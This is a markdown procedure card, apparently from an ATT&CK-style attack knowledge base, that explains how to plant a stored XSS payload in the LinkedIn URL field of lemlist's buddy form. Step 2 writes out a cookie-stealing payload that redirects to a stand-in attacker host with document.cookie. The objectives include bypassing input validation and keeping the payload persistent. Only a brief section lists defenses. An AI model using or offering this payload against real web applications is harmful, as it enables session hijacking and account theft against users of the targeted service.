---
id: proc-inject-js-linkedin
tags:
  - xss
  - stored-xss
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:18.069Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-JavaScript-into-LinkedIn-URL

## Summary

This procedure involves entering a JavaScript URI payload into the LinkedIn URL field of a lemlist buddy entry, exploiting the lack of sanitization to store executable code for later triggering.

## Description

The LinkedIn URL field in lemlist's Buddies-to-Be section accepts user input without proper validation, allowing storage of javascript: schemes. This stored XSS enables attackers to inject payloads that execute in the victim's browser context when rendered, potentially stealing cookies or performing actions. The target is the web form during campaign editing, with outcomes including persistent script storage across sessions.

## Requirements

1. Active buddy entry form from previous setup
2. Knowledge of JavaScript payloads (e.g., alert or fetch for exfiltration)
3. Authenticated access to save changes

## Defense

Defensive measures and detection strategies:

- Sanitize URL inputs to block javascript: schemes and script tags
- Implement server-side validation and content security policies (CSP)
- Log and alert on anomalous URL patterns in stored data

## Objectives

1. Bypass input validation for payload storage
2. Ensure the payload persists in the buddy profile
3. Prepare for execution via user interaction

## Instructions

### Step 1: Locate LinkedIn URL Field

**Context**: Identify the input field for the LinkedIn account link within the buddy form.

Scroll to or click the LinkedIn section in the form.

> Field is a standard text input accepting any string.

### Step 2: Enter Payload and Save

**Context**: Insert the malicious JavaScript and commit the changes.

Type `javascript:alert('XSS')` or `javascript:document.location='https://attacker.com?'+document.cookie` into the field, then click Save.

> No errors; payload stores as the URL value.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
